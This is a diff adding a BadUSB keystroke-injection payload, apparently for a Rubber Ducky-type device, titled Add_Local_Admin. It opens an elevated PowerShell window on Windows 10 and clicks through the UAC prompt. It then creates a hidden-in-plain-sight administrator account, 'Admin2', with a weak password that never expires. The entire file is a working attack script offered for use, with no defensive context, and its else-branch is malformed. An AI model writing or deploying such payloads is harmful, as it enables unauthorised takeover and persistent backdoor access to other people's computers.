@@ -1,0 +1,71 @@
+REM Title: Add_Local_Admin
+REM Author: LulzAnarchyAnon
+REM Description: Administrator PowerShell is opened, and a script 
+REM runs that adds a Local Admin User. 
+REM Target: Windows 10 PowerShell 
+REM Props: Darren Kitchen, and I am Jakoby
+REM Version: 1.0
+REM Category: Execution
+
+GUI x
+DELAY 500
+a
+DELAY 500
+ALT y
+Delay 2000
+
+STRING $Username = "Admin2"
+DELAY 2000
+ENTER
+STRING $Password = "password"
+DELAY 2000
+ENTER
+STRING $group = "Administrators"
+DELAY 2000
+ENTER
+STRING $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+DELAY 5000
+ENTER
+STRING $existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+DELAY 5000
+ENTER
+STRING if ($existing -eq $null) {
+DELAY 2000
+ENTER
+STRING    Write-Host "Creating new local user $Username."
+DELAY 5000
+ENTER
+STRING    & NET USER $Username $Password /add /y /expires:never
+DELAY 5000  
+ENTER 
+STRING    Write-Host "Adding local user $Username to $group."
+DELAY 5000
+ENTER
+STRING    & NET LOCALGROUP $group $Username /add
+DELAY 5000
+ENTER
+STRING }
+DELAY 2000
+ENTER
+STRING      {
+DELAY 2000
+ENTER
+STRING    Write-Host "Setting password for existing local user $Username."
+DELAY 5000
+ENTER
+STRING    $existing.SetPassword($Password)
+DELAY 2000
+ENTER
+STRING }
+DELAY 2000
+ENTER
+STRING Write-Host "Ensuring password for $Username never expires."
+DELAY 5000
+ENTER
+STRING & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
+DELAY 5000
+ENTER
+DELAY 1000
+STRING exit
+DELAY 100
+ENTER
